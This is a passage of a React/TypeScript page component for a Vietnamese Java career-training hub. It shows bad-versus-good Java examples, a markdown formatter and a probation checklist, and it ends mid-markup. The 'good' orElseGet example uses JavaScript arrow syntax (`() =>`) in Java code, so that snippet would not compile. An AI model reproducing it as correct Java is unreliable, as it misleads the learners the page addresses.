    try {
        User u = userService.findById(id);
        res.put("data", u);
    } catch (Exception e) {
        // Nuốt lỗi hoặc trả HTTP 200 kèm cờ error!
        res.put("error", "Đã có lỗi xảy ra");
    }
    return res;
}`,
    badExplanation: 'Nuốt ngoại lệ khiến hệ thống không biết chuyện gì thực sự xảy ra. Trả mã 200 OK cho trường hợp lỗi khiến API Gateway và Frontend không thể bắt sự kiện chuẩn xác.',
    goodTitle: '✅ Chuẩn đi làm (Custom Exception + RFC 7807 Problem Detail)',
    goodCode: `// 1. Ném Custom Business Exception khi có lỗi
if (user == null) {
    throw new ResourceNotFoundException("Không tìm thấy người dùng với ID: " + id);
}

// 2. Bắt tập trung tại Global Exception Handler:
@RestControllerAdvice
public class GlobalExceptionHandler {
    @ExceptionHandler(ResourceNotFoundException.class)
    public ProblemDetail handleNotFound(ResourceNotFoundException ex) {
        ProblemDetail problem = ProblemDetail.forStatusAndDetail(HttpStatus.NOT_FOUND, ex.getMessage());
        problem.setProperty("timestamp", Instant.now());
        problem.setProperty("errorCode", "USER_NOT_FOUND");
        return problem; // Trả đúng HTTP 404 chuẩn quốc tế
    }
}`,
    goodExplanation: 'Sử dụng @RestControllerAdvice giúp tách rời 100% logic xử lý lỗi ra khỏi Service/Controller. Mã nguồn nghiệp vụ sạch bóng các khối try-catch rườm rà.'
  },
  {
    id: 'batch-insert-vs-loop',
    title: '7. Batch Insert (saveAll) vs Vòng lặp save() từng dòng',
    category: 'Database / JPA',
    impactBadge: 'Tiết kiệm 95% thời gian ghi Database',
    badTitle: '❌ Thói quen ở trường (Gọi save() trong vòng lặp for)',
    badCode: `// Có danh sách 5,000 sản phẩm mới:
for (Product p : products) {
    // MỖI VÒNG LẶP LÀ 1 LẦN MỞ TRANSACTION & 1 LẦN GỬI NETWORK!
    productRepository.save(p);
}`,
    badExplanation: '5,000 lần gọi save() đồng nghĩa với 5,000 round-trip mạng tới Database server. Thao tác này có thể tốn từ 20 đến 40 giây và làm nghẽn toàn bộ kết nối DB.',
    goodTitle: '✅ Chuẩn đi làm (Hibernate Batching + rewriteBatchedStatements)',
    goodCode: `// 1. Cấu hình application.yml:
// spring.jpa.properties.hibernate.jdbc.batch_size: 50
// spring.datasource.url: jdbc:mysql://...?rewriteBatchedStatements=true

// 2. Gửi nguyên danh sách một lần:
productRepository.saveAll(products);

// Database sẽ nhận các gói gom 50 dòng trong đúng 1 lệnh INSERT duy nhất:
// INSERT INTO products (name, price) VALUES (...), (...), (...);`,
    goodExplanation: 'Hibernate Batching kết hợp cấu hình JDBC rewrite gom hàng chục câu lệnh INSERT thành một gói tin mạng duy nhất, rút ngắn thời gian từ 30 giây xuống dưới 1 giây!'
  },
  {
    id: 'optional-orelseget-trap',
    title: '8. Optional.orElseGet() (Lazy) vs Optional.orElse() (Eager Trap)',
    category: 'Core Java',
    impactBadge: 'Tránh thực thi thừa thao tác nặng / tốn phí',
    badTitle: '❌ Thói quen ở trường (Dùng orElse với phương thức tốn kém)',
    badCode: `User user = userRepository.findByEmail(email)
    .orElse(authServiceClient.createNewRemoteUser(email)); // BẪY NGUY HIỂM!
    
// Dù user ĐÃ TỒN TẠI trong Database, hàm createNewRemoteUser(email)
// VẪN BỊ GỌI VÀ THỰC THI NGAY LẬP TỨC (Eager Evaluation)!`,
    badExplanation: 'Trong Java, tham số truyền vào hàm orElse(...) luôn bị tính toán ngay khi dòng code chạy qua. Nếu bên trong là lệnh gọi API bên ngoài, gửi email hoặc ghi DB, nó sẽ kích hoạt ngoài ý muốn!',
    goodTitle: '✅ Chuẩn đi làm (Dùng orElseGet với Lambda Supplier)',
    goodCode: `User user = userRepository.findByEmail(email)
    .orElseGet(() => authServiceClient.createNewRemoteUser(email));

// orElseGet nhận một Supplier (Functional Interface).
// Chỉ khi nào Optional rỗng (Empty) thì hàm Lambda mới được thực thi (Lazy)!`,
    goodExplanation: 'orElseGet() áp dụng cơ chế Lazy Evaluation. Nếu giá trị đã có sẵn, Lambda tuyệt đối không được gọi, tiết kiệm tối đa CPU, RAM và tránh các tác dụng phụ (side effects) tai hại.'
  }
];

// ==========================================
// 3. DOCUMENTATION FORMATTER HELPERS
// ==========================================

function parseInlineMarkdown(text: string, accentColor: string = '#38bdf8'): (string | React.JSX.Element)[] {
  const parts: (string | React.JSX.Element)[] = [];
  const regex = /(\*\*[^*]+\*\*|`[^`]+`)/g;
  let lastIdx = 0;
  let match: RegExpExecArray | null;

  while ((match = regex.exec(text)) !== null) {
    if (match.index > lastIdx) {
      parts.push(text.substring(lastIdx, match.index));
    }
    const token = match[0];
    if (token.startsWith('**') && token.endsWith('**')) {
      const boldText = token.slice(2, -2);
      parts.push(
        <strong key={`b-${match.index}`} style={{ color: '#ffffff', fontWeight: 700 }}>
          {boldText}
        </strong>
      );
    } else if (token.startsWith('`') && token.endsWith('`')) {
      const codeText = token.slice(1, -1);
      parts.push(
        <code
          key={`c-${match.index}`}
          style={{
            background: 'rgba(56, 189, 248, 0.12)',
            color: '#38bdf8',
            padding: '2px 6px',
            borderRadius: '4px',
            fontSize: '0.88em',
            fontFamily: 'Consolas, Monaco, "Courier New", monospace',
            border: '1px solid rgba(56, 189, 248, 0.25)'
          }}
        >
          {codeText}
        </code>
      );
    }
    lastIdx = regex.lastIndex;
  }

  if (lastIdx < text.length) {
    parts.push(text.substring(lastIdx));
  }
  return parts;
}

function FormattedDocContent({ text, accentColor }: { text: string; accentColor: string }): React.JSX.Element {
  const lines = text.split('\n');
  const elements: React.JSX.Element[] = [];
  let inCodeBlock = false;
  let codeBuffer: string[] = [];
  let codeLang = '';

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];

    if (line.trim().startsWith('```')) {
      if (inCodeBlock) {
        elements.push(
          <div key={`code-blk-${i}`} style={{
            margin: '14px 0 18px 0',
            background: '#090d16',
            borderRadius: '8px',
            border: '1px solid rgba(255, 255, 255, 0.12)',
            overflow: 'hidden'
          }}>
            <div style={{
              padding: '6px 14px',
              background: 'rgba(255, 255, 255, 0.04)',
              borderBottom: '1px solid rgba(255, 255, 255, 0.08)',
              fontSize: '11px',
              fontWeight: 700,
              color: 'rgba(255, 255, 255, 0.6)',
              letterSpacing: '0.05em'
            }}>
              <span>{codeLang.toUpperCase() || 'SNIPPET'}</span>
            </div>
            <pre style={{ margin: 0, padding: '14px 16px', fontSize: '13.5px', background: 'transparent', color: '#e2e8f0', lineHeight: 1.55, overflowX: 'auto' }}>
              <code>{codeBuffer.join('\n')}</code>
            </pre>
          </div>
        );
        codeBuffer = [];
        inCodeBlock = false;
      } else {
        inCodeBlock = true;
        codeLang = line.trim().replace('```', '');
      }
      continue;
    }

    if (inCodeBlock) {
      codeBuffer.push(line);
      continue;
    }

    const trimmed = line.trim();
    if (!trimmed) {
      elements.push(<div key={`sp-${i}`} style={{ height: '8px' }} />);
      continue;
    }

    // Numbered item: e.g. "1. **Title:** text" or "1. **Title**"
    const numberedMatch = trimmed.match(/^([0-9]+)\.\s*\*\*(.*?)\*\*(.*)$/);
    if (numberedMatch) {
      const num = numberedMatch[1];
      const heading = numberedMatch[2];
      const rest = numberedMatch[3];
      elements.push(
        <div key={`num-${i}`} style={{
          marginTop: '16px',
          marginBottom: '10px',
          padding: '12px 16px',
          borderRadius: '10px',
          background: 'rgba(255, 255, 255, 0.025)',
          borderLeft: `4px solid ${accentColor}`,
          borderTop: '1px solid rgba(255, 255, 255, 0.05)',
          borderRight: '1px solid rgba(255, 255, 255, 0.05)',
          borderBottom: '1px solid rgba(255, 255, 255, 0.05)'
        }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: rest && rest.trim() ? '6px' : '0' }}>
            <span style={{
              background: accentColor,
              color: '#000000',
              fontWeight: 900,
              fontSize: '12px',
              padding: '2px 8px',
              borderRadius: '6px'
            }}>
              {num}
            </span>
            <span style={{ fontSize: '15.5px', fontWeight: 800, color: '#ffffff' }}>
              {heading}
            </span>
          </div>
          {rest && rest.trim() && (
            <div style={{ fontSize: '14.5px', color: 'rgba(255, 255, 255, 0.85)', lineHeight: 1.65, paddingLeft: '28px' }}>
              {parseInlineMarkdown(rest.trim().replace(/^:\s*/, ''), accentColor)}
            </div>
          )}
        </div>
      );
      continue;
    }

    // Callout alert line: e.g. "⚠️ ...", "❌ ...", "👉 ...", "✅ ..."
    if (trimmed.startsWith('⚠️') || trimmed.startsWith('❌') || trimmed.startsWith('👉') || trimmed.startsWith('✅')) {
      const isWarn = trimmed.startsWith('⚠️') || trimmed.startsWith('❌');
      elements.push(
        <div key={`alert-${i}`} style={{
          margin: '12px 0',
          padding: '12px 16px',
          borderRadius: '8px',
          background: isWarn ? 'rgba(239, 68, 68, 0.08)' : 'rgba(52, 211, 153, 0.08)',
          border: `1px solid ${isWarn ? 'rgba(239, 68, 68, 0.25)' : 'rgba(52, 211, 153, 0.25)'}`,
          fontSize: '14.5px',
          color: isWarn ? '#fca5a5' : '#a7f3d0',
          lineHeight: 1.65
        }}>
          {parseInlineMarkdown(trimmed, accentColor)}
        </div>
      );
      continue;
    }

    // Bullet point: "- " or "* "
    if (trimmed.startsWith('- ') || trimmed.startsWith('* ')) {
      const bulletContent = trimmed.substring(2);
      elements.push(
        <div key={`bullet-${i}`} style={{
          display: 'flex',
          gap: '10px',
          alignItems: 'flex-start',
          margin: '6px 0',
          paddingLeft: '14px',
          fontSize: '14.5px',
          color: 'rgba(255, 255, 255, 0.88)',
          lineHeight: 1.65
        }}>
          <span style={{ color: accentColor, fontWeight: 900, fontSize: '14px', marginTop: '1px' }}>•</span>
          <div style={{ flex: 1 }}>{parseInlineMarkdown(bulletContent, accentColor)}</div>
        </div>
      );
      continue;
    }

    // Default paragraph
    elements.push(
      <p key={`p-${i}`} style={{
        margin: '8px 0',
        fontSize: '15px',
        color: 'rgba(255, 255, 255, 0.88)',
        lineHeight: 1.75
      }}>
        {parseInlineMarkdown(trimmed, accentColor)}
      </p>
    );
  }

  return <div>{elements}</div>;
}

// ==========================================
// 4. MAIN COMPONENT EXPORT
// ==========================================

export default function CareerHubPage(): React.JSX.Element {
  const [activeMainTab, setActiveMainTab] = useState<'lessons' | 'tips50' | 'interview' | 'battles' | 'cv' | 'probation'>('lessons');

  // Lessons state
  const [selectedModuleId, setSelectedModuleId] = useState<string>('core-java');
  const [selectedTopicId, setSelectedTopicId] = useState<string>('stack-vs-heap');

  // 50 Tips state
  const [tipsCategoryFilter, setTipsCategoryFilter] = useState<string>('All');
  const [tipsSearchQuery, setTipsSearchQuery] = useState<string>('');
  const [expandedTipId, setExpandedTipId] = useState<number | null>(1);

  // Interview state
  const [interviewSearch, setInterviewSearch] = useState<string>('');
  const [selectedCategory, setSelectedCategory] = useState<string>('All');
  const [selectedLevelFilter, setSelectedLevelFilter] = useState<string>('All');
  const [expandedQuestionId, setExpandedQuestionId] = useState<string | null>('q-1');

  // Battles state
  const [selectedBattleIndex, setSelectedBattleIndex] = useState<number>(0);

  // Snippet Copy State
  const [copiedSnippetId, setCopiedSnippetId] = useState<string | null>(null);
  const handleCopyCode = (text: string, id: string) => {
    if (typeof navigator !== 'undefined' && navigator.clipboard) {
      navigator.clipboard.writeText(text);
      setCopiedSnippetId(id);
      setTimeout(() => setCopiedSnippetId(null), 2000);
    }
  };

  // Probation checks (localStorage persisted)
  const [checkedProbation, setCheckedProbation] = useState<Record<string, boolean>>({
    'p-1': true,
    'p-2': true,
    'p-3': true
  });

  const filteredTips = useMemo(() => {
    return FIFTY_PRACTICAL_TIPS.filter(tip => {
      const matchCat = tipsCategoryFilter === 'All' || tip.category === tipsCategoryFilter;
      const q = tipsSearchQuery.toLowerCase();
      const matchSearch = tip.title.toLowerCase().includes(q) ||
                          tip.summary.toLowerCase().includes(q) ||
                          tip.detail.toLowerCase().includes(q);
      return matchCat && matchSearch;
    });
  }, [tipsCategoryFilter, tipsSearchQuery]);

  const filteredInterviewQuestions = useMemo(() => {
    return INTERVIEW_QUESTIONS.filter(q => {
      const matchCat = selectedCategory === 'All' || q.category === selectedCategory;
      const matchLevel = selectedLevelFilter === 'All' || q.level === selectedLevelFilter;
      const s = interviewSearch.toLowerCase();
      const matchSearch = q.question.toLowerCase().includes(s) ||
                          q.shortAnswer.toLowerCase().includes(s) ||
                          q.seniorDeepDive.toLowerCase().includes(s) ||
                          q.trapWarning.toLowerCase().includes(s);
      return matchCat && matchLevel && matchSearch;
    });
  }, [selectedCategory, selectedLevelFilter, interviewSearch]);

  useEffect(() => {
    try {
      const saved = localStorage.getItem('hub_probation_checklist_v2');
      if (saved) setCheckedProbation(JSON.parse(saved));
    } catch (e) {}
  }, []);

  const toggleCheck = (id: string) => {
    setCheckedProbation(prev => {
      const updated = { ...prev, [id]: !prev[id] };
      try {
        localStorage.setItem('hub_probation_checklist_v2', JSON.stringify(updated));
      } catch (e) {}
      return updated;
    });
  };

  const PROBATION_TASKS = [
    { id: 'p-1', phase: 'Tuần 1: Onboarding', text: 'Chạy thành công dự án Local trong 48h đầu (JDK, Maven, Docker DB)', desc: 'Không cần hỏi Senior những lỗi cơ bản đã có trong README.' },
    { id: 'p-2', phase: 'Tuần 1: Onboarding', text: 'Đọc và hiểu luồng kiến trúc nghiệp vụ (Domain & Data Flow)', desc: 'Nắm được luồng request từ Gateway -> Controller -> Service -> DB.' },
    { id: 'p-3', phase: 'Tuần 1: Onboarding', text: 'Nắm vững quy tắc Git branching và commit message của team', desc: 'Quy chuẩn tên branch: feature/JIRA-123-ten-task, atomic commits.' },
    { id: 'p-4', phase: 'Tuần 1: Onboarding', text: 'Chủ động cập nhật lại file README nếu thấy tài liệu cũ bị thiếu', desc: 'Điểm cộng cực lớn giúp bạn ghi điểm chu đáo ngay từ tuần đầu.' },
    { id: 'p-5', phase: 'Tuần 1: Onboarding', text: 'Cấu hình SSH Key, GPG Signing và VPN công ty an toàn trong 24h', desc: 'Đảm bảo môi trường làm việc bảo mật, không commit bằng thông tin cá nhân sai lệch.' },
    { id: 'p-6', phase: 'Tuần 2-4: First Tasks', text: 'Mở 3 PR gần nhất của Senior để học hỏi Coding Convention', desc: 'Bắt chước cách đặt tên biến, package, xử lý exception và ghi log.' },
    { id: 'p-7', phase: 'Tuần 2-4: First Tasks', text: 'Luôn viết Unit Test đi kèm mọi dòng code mới', desc: 'Không nộp PR thiếu test; test bao phủ cả happy path và error path.' },
    { id: 'p-8', phase: 'Tuần 2-4: First Tasks', text: 'Thái độ cầu thị và lịch sự khi nhận Code Review', desc: 'Không tự ái, cảm ơn khi được góp ý và sửa triệt để trước khi ping lại.' },
    { id: 'p-9', phase: 'Tuần 2-4: First Tasks', text: 'Tự phác thảo tài liệu API Specs (OpenAPI/Swagger) trước khi code', desc: 'Trao đổi và thống nhất hợp đồng API với Frontend trước khi triển khai.' },
    { id: 'p-10', phase: 'Tuần 2-4: First Tasks', text: 'Biết cách đọc và cấu hình Application Profiler & Actuator Metrics', desc: 'Theo dõi chỉ số JVM memory, heap allocation và database query count.' },
    { id: 'p-11', phase: 'Tháng 2: Ownership', text: 'Báo cáo Daily Standup ngắn gọn: Làm gì - Sắp làm gì - Blocker', desc: 'Không nói chung chung "em đang nghiên cứu", nói rõ kết quả và rào cản.' },
    { id: 'p-12', phase: 'Tháng 2: Ownership', text: 'Estimate thời gian có vùng đệm an toàn (Buffer 1.5x)', desc: 'Dự kiến 1 ngày thì estimate 1.5 ngày để dành thời gian viết test và fix bug.' },
    { id: 'p-13', phase: 'Tháng 2: Ownership', text: 'Tự điều tra lỗi 15-30 phút trước khi nhờ Senior trợ giúp', desc: 'Áp dụng quy tắc 4 bước hỏi bài để Senior hỗ trợ nhiệt tình nhất.' },
    { id: 'p-14', phase: 'Tháng 2: Ownership', text: 'Chủ động đề xuất xóa nợ kỹ thuật (Technical Debt) cho module cũ', desc: 'Tái cấu trúc code bẩn, bổ sung unit test cho các đoạn code thiếu test.' },
    { id: 'p-15', phase: 'Tháng 2: Ownership', text: 'Tham gia quan sát và hỗ trợ Incident Response cùng các anh Senior', desc: 'Học cách đọc log phân tán, tra cứu traceId và xử lý khủng hoảng lúc deploy.' }
  ];

  const completedCount = Object.values(checkedProbation).filter(Boolean).length;
  const progressPercent = Math.round((completedCount / PROBATION_TASKS.length) * 100);

  const activeModule = KNOWLEDGE_MODULES.find(m => m.id === selectedModuleId) || KNOWLEDGE_MODULES[0];
  const activeTopic = activeModule.topics.find(t => t.id === selectedTopicId) || activeModule.topics[0];
  const totalTopicsCount = KNOWLEDGE_MODULES.reduce((acc, m) => acc + m.topics.length, 0);

  return (
    <Layout
      title="Java Career Hub — Cẩm Nang Thực Chiến Fresher / Junior Đi Làm"
      description="Trung tâm huấn luyện kỹ năng thực chiến Backend Java từ docs cho Intern, Fresher và Junior: Tư duy bộ nhớ Stack/Heap, Spring Boot, N+1 Query, Unit Test, Bí kíp viết CV và Phỏng vấn."
    >
      <div style={{
        minHeight: '100vh',
        background: 'linear-gradient(180deg, #090d16 0%, #0d1117 100%)',
        padding: '32px 16px 80px 16px',
        color: '#ffffff'
      }}>
        <div style={{ maxWidth: '1240px', margin: '0 auto' }}>

          {/* ======================================================== */}
          {/* HERO BANNER */}
          {/* ======================================================== */}
          <div style={{ textAlign: 'center', marginBottom: '36px' }}>
            <div style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: '8px',
              padding: '6px 16px',
              borderRadius: '20px',
              background: 'rgba(56, 189, 248, 0.1)',
              border: '1px solid rgba(56, 189, 248, 0.3)',
              color: '#38bdf8',
              fontSize: '13px',
              fontWeight: 800,
              letterSpacing: '0.05em',
              textTransform: 'uppercase',
              marginBottom: '16px'
            }}>
              <span>🎓 DÀNH CHO INTERN • FRESHER • JUNIOR BACKEND</span>
            </div>

            <h1 style={{
              fontSize: '2.75rem',
              fontWeight: 900,
              letterSpacing: '-0.02em',
              margin: '0 0 14px 0',
              lineHeight: 1.25
            }}>
              <span style={{
                background: 'linear-gradient(135deg, #38bdf8 0%, #34d399 50%, #fbbf24 100%)',
                WebkitBackgroundClip: 'text',
                WebkitTextFillColor: 'transparent'
              }}>
                Java Career Accelerator Hub
              </span>
            </h1>

            <p style={{
              fontSize: '1.18rem',
              color: 'rgba(255, 255, 255, 0.82)',
              maxWidth: '860px',
              margin: '0 auto 24px auto',
              lineHeight: 1.7
            }}>
              Toàn bộ kiến thức tinh hoa được cô đọng trực tiếp từ kho tài liệu kỹ thuật: <strong>Hiểu bản chất dưới nắp ca-pô</strong>, xóa bỏ thói quen code nghiệp dư ở trường và chuẩn bị hành trang vững chắc để xin việc & pass thử việc.
            </p>

            {/* Quick Metrics */}
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              flexWrap: 'wrap',
              gap: '12px'
            }}>
              {[
                { label: `${KNOWLEDGE_MODULES.length} Khối Kiến Thức (${totalTopicsCount} Chuyên Đề)`, desc: 'Java • Spring • JPA • Test • Clean Code • Văn Hóa • Redis • Kafka • Security', color: '#38bdf8' },
                { label: `${FIFTY_PRACTICAL_TIPS.length} Bí Quyết Thực Chiến`, desc: 'Quy tắc vàng sống còn khi đi làm', color: '#ec4899' },
                { label: 'Chiến Thuật Phỏng Vấn', desc: 'Bẫy phỏng vấn & Cách trả lời 10 điểm', color: '#fbbf24' },
                { label: 'Checklist 60 Ngày Thử Việc', desc: `Tiến độ: ${progressPercent}% hoàn thành`, color: '#f97316' }
              ].map((chip, i) => (
                <div key={i} style={{
                  padding: '10px 16px',
                  borderRadius: '10px',
                  background: 'rgba(255, 255, 255, 0.03)',
                  border: '1px solid rgba(255, 255, 255, 0.08)',
                  fontSize: '14px',
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  minWidth: '180px'
                }}>
                  <span style={{ color: chip.color, fontWeight: 800 }}>{chip.label}</span>
                  <span style={{ color: 'rgba(255, 255, 255, 0.65)', fontSize: '12.5px', marginTop: '3px' }}>{chip.desc}</span>
                </div>
              ))}
            </div>
          </div>

          {/* ======================================================== */}
          {/* MAIN NAVIGATION BAR */}
          {/* ======================================================== */}
          <div style={{
            display: 'flex',
            justifyContent: 'center',
            gap: '10px',
            flexWrap: 'wrap',
            marginBottom: '32px',
            borderBottom: '1px solid rgba(255, 255, 255, 0.08)',
            paddingBottom: '16px'
          }}>
            {[
              { id: 'lessons', label: '📘 Kho Tri Thức Thực Chiến', color: '#38bdf8' },
              { id: 'tips50', label: `⚡ ${FIFTY_PRACTICAL_TIPS.length} Bí Quyết Đi Làm`, color: '#ec4899' },
              { id: 'interview', label: '🎯 Phỏng Vấn "Trúng Tủ"', color: '#34d399' },
              { id: 'battles', label: `⚔️ Trường Học vs Đi Làm (${CODE_BATTLES.length} Trận)`, color: '#fbbf24' },
              { id: 'cv', label: '📄 Bí Kíp Viết CV Backend', color: '#a78bfa' },
              { id: 'probation', label: `📋 Checklist Thử Việc (${progressPercent}%)`, color: '#f97316' }
            ].map((tab) => {
              const isActive = activeMainTab === tab.id;
              return (
                <button
                  key={tab.id}
                  onClick={() => setActiveMainTab(tab.id as any)}
                  style={{
                    padding: '11px 20px',
                    borderRadius: '10px',
                    background: isActive ? `${tab.color}22` : 'rgba(255, 255, 255, 0.03)',
                    border: `1px solid ${isActive ? tab.color : 'rgba(255, 255, 255, 0.1)'}`,
                    color: isActive ? tab.color : 'rgba(255, 255, 255, 0.8)',
                    fontWeight: isActive ? 800 : 600,
                    fontSize: '15px',
                    cursor: 'pointer',
                    transition: 'all 0.2s ease',
                    boxShadow: isActive ? `0 0 15px ${tab.color}33` : 'none'
                  }}
                >
                  {tab.label}
                </button>
              );
            })}
          </div>

          {/* ======================================================== */}
          {/* TAB 1: KHO TRI THỨC THỰC CHIẾN (DEEP LESSONS) */}
          {/* ======================================================== */}
          {activeMainTab === 'lessons' && (() => {
            const currentTopicIndex = activeModule.topics.findIndex(t => t.id === activeTopic.id);
            const prevTopic = currentTopicIndex > 0 ? activeModule.topics[currentTopicIndex - 1] : null;
            const nextTopic = currentTopicIndex < activeModule.topics.length - 1 ? activeModule.topics[currentTopicIndex + 1] : null;
            const currentModIndex = KNOWLEDGE_MODULES.findIndex(m => m.id === activeModule.id);
            const nextModule = currentModIndex < KNOWLEDGE_MODULES.length - 1 ? KNOWLEDGE_MODULES[currentModIndex + 1] : null;

            return (
              <div>
                {/* 1. Module Selector: Modern 9-Card Grid */}
                <div style={{
                  display: 'grid',
                  gridTemplateColumns: 'repeat(auto-fit, minmax(230px, 1fr))',
                  gap: '12px',
                  marginBottom: '24px'
                }}>
                  {KNOWLEDGE_MODULES.map((mod, idx) => {
                    const isSelected = selectedModuleId === mod.id;
                    const modNum = String(idx + 1).padStart(2, '0');
                    return (
                      <div
                        key={mod.id}
                        onClick={() => {
                          setSelectedModuleId(mod.id);
                          setSelectedTopicId(mod.topics[0].id);
                        }}
                        style={{
                          padding: '14px 16px',
                          borderRadius: '12px',
                          background: isSelected
                            ? `linear-gradient(135deg, ${mod.accentColor}22 0%, rgba(255, 255, 255, 0.03) 100%)`
                            : 'rgba(255, 255, 255, 0.025)',
                          border: `1.5px solid ${isSelected ? mod.accentColor : 'rgba(255, 255, 255, 0.08)'}`,
                          cursor: 'pointer',
                          transition: 'all 0.25s cubic-bezier(0.16, 1, 0.3, 1)',
                          boxShadow: isSelected ? `0 0 20px ${mod.accentColor}30` : 'none',
                          transform: isSelected ? 'translateY(-2px)' : 'none',
                          position: 'relative',
                          overflow: 'hidden'
                        }}
                      >
                        {isSelected && (
                          <div style={{
                            position: 'absolute',
                            top: 0,
                            left: 0,
                            right: 0,
                            height: '3px',
                            background: `linear-gradient(90deg, ${mod.accentColor}, transparent)`
                          }} />
                        )}
                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '8px' }}>
                          <span style={{ fontSize: '24px' }}>{mod.icon}</span>
                          <span style={{
                            fontSize: '11px',
                            fontWeight: 800,
                            padding: '2px 8px',
                            borderRadius: '12px',
                            background: isSelected ? mod.accentColor : 'rgba(255, 255, 255, 0.07)',
                            color: isSelected ? '#000000' : 'rgba(255, 255, 255, 0.65)'
                          }}>
                            #{modNum} • {mod.topics.length} bài
                          </span>
                        </div>
                        <div style={{
                          fontSize: '15px',
                          fontWeight: 800,
                          color: isSelected ? '#ffffff' : 'rgba(255, 255, 255, 0.85)',
                          lineHeight: 1.35,
                          marginBottom: '4px'
                        }}>
                          {mod.title}
                        </div>
                        <div style={{
                          fontSize: '12px',
                          color: isSelected ? mod.accentColor : 'rgba(255, 255, 255, 0.5)',
                          whiteSpace: 'nowrap',
                          overflow: 'hidden',
                          textOverflow: 'ellipsis'
                        }}>
                          {mod.tagline}
                        </div>
                      </div>
                    );
                  })}
                </div>

                {/* 2. Active Module Hero Strip */}
                <div style={{
                  padding: '16px 20px',
                  borderRadius: '12px',
                  background: 'linear-gradient(90deg, rgba(255, 255, 255, 0.04) 0%, rgba(255, 255, 255, 0.01) 100%)',
                  border: `1px solid ${activeModule.accentColor}35`,
                  marginBottom: '20px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  flexWrap: 'wrap',
                  gap: '12px'
                }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                    <span style={{
                      fontSize: '28px',
                      background: `${activeModule.accentColor}22`,
                      padding: '8px',
                      borderRadius: '10px',
                      display: 'inline-flex'
                    }}>
                      {activeModule.icon}
                    </span>
                    <div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                        <span style={{ fontSize: '18px', fontWeight: 800, color: '#ffffff' }}>
                          {activeModule.title}
                        </span>
                        <span style={{
                          fontSize: '11px',
                          fontWeight: 800,
                          padding: '2px 8px',
                          borderRadius: '10px',
                          background: `${activeModule.accentColor}25`,
                          color: activeModule.accentColor
                        }}>
                          MODULE #{String(currentModIndex + 1).padStart(2, '0')}
                        </span>
                      </div>
                      <div style={{ fontSize: '13.5px', color: 'rgba(255, 255, 255, 0.7)', marginTop: '2px' }}>
                        {activeModule.tagline}
                      </div>
                    </div>
                  </div>

                  <div style={{
                    display: 'flex',
                    alignItems: 'center',
                    gap: '12px',
                    fontSize: '13px',
                    color: 'rgba(255, 255, 255, 0.7)'
                  }}>
                    <span>Đang xem bài: <strong style={{ color: activeModule.accentColor }}>{currentTopicIndex + 1}</strong> / {activeModule.topics.length}</span>
                    <div style={{
                      width: '80px',
                      height: '6px',
                      borderRadius: '3px',
                      background: 'rgba(255, 255, 255, 0.1)',
                      overflow: 'hidden'
                    }}>
                      <div style={{
                        width: `${((currentTopicIndex + 1) / activeModule.topics.length) * 100}%`,
                        height: '100%',
                        background: activeModule.accentColor,
                        borderRadius: '3px',
                        transition: 'width 0.3s ease'
                      }} />
                    </div>
                  </div>
                </div>

                {/* 3. Split Layout: Left Topic Index vs Right Deep-Dive Reader */}
                <div style={{ display: 'grid', gridTemplateColumns: '310px 1fr', gap: '20px', alignItems: 'start' }}>
                  <style>{`
                    @media (max-width: 900px) {
                      div[style*="gridTemplateColumns: 310px 1fr"] {
                        grid-template-columns: 1fr !important;
                      }
                    }
                  `}</style>

                  {/* Left Column: Topic Index Pills */}
                  <div style={{
                    background: 'rgba(15, 23, 42, 0.6)',
                    border: '1px solid rgba(255, 255, 255, 0.08)',
                    borderRadius: '14px',
                    padding: '14px',
                    position: 'sticky',
                    top: '20px'
                  }}>
                    <div style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: '4px 6px 12px 6px',
                      borderBottom: '1px solid rgba(255, 255, 255, 0.08)',
                      marginBottom: '10px'
                    }}>
                      <span style={{ fontSize: '12px', fontWeight: 800, color: 'rgba(255, 255, 255, 0.6)', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
                        📑 Danh Sách Chuyên Đề
                      </span>
                      <span style={{ fontSize: '11px', color: activeModule.accentColor, fontWeight: 700 }}>
                        {activeModule.topics.length} bài học
                      </span>
                    </div>

                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                      {activeModule.topics.map((t, idx) => {
                        const isTopicSelected = selectedTopicId === t.id;
                        const topicNum = String(idx + 1).padStart(2, '0');
                        return (
                          <div
                            key={t.id}
                            onClick={() => setSelectedTopicId(t.id)}
                            style={{
                              padding: '11px 13px',
                              borderRadius: '10px',
                              background: isTopicSelected
                                ? `linear-gradient(90deg, ${activeModule.accentColor}25 0%, rgba(255, 255, 255, 0.02) 100%)`
                                : 'rgba(255, 255, 255, 0.02)',
                              border: `1px solid ${isTopicSelected ? activeModule.accentColor : 'rgba(255, 255, 255, 0.05)'}`,
                              borderLeft: isTopicSelected ? `4px solid ${activeModule.accentColor}` : undefined,
                              cursor: 'pointer',
                              transition: 'all 0.2s ease',
                              display: 'flex',
                              flexDirection: 'column',
                              gap: '5px'
                            }}
                          >
                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                              <span style={{
                                fontSize: '11px',
                                fontWeight: 800,
                                color: isTopicSelected ? activeModule.accentColor : 'rgba(255, 255, 255, 0.45)'
                              }}>
                                #{topicNum}
                              </span>
                              <span style={{
                                fontSize: '10.5px',
                                fontWeight: 800,
                                padding: '1px 6px',
                                borderRadius: '4px',
                                background: isTopicSelected ? `${activeModule.accentColor}30` : 'rgba(255, 255, 255, 0.05)',
                                color: isTopicSelected ? activeModule.accentColor : 'rgba(255, 255, 255, 0.55)'
                              }}>
                                {t.badge}
                              </span>
                            </div>
                            <div style={{
                              fontSize: '13.5px',
                              fontWeight: isTopicSelected ? 800 : 600,
                              color: isTopicSelected ? '#ffffff' : 'rgba(255, 255, 255, 0.8)',
                              lineHeight: 1.35
                            }}>
                              {t.title}
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  </div>

                  {/* Right Column: Deep-Dive Document Reader */}
                  <div style={{
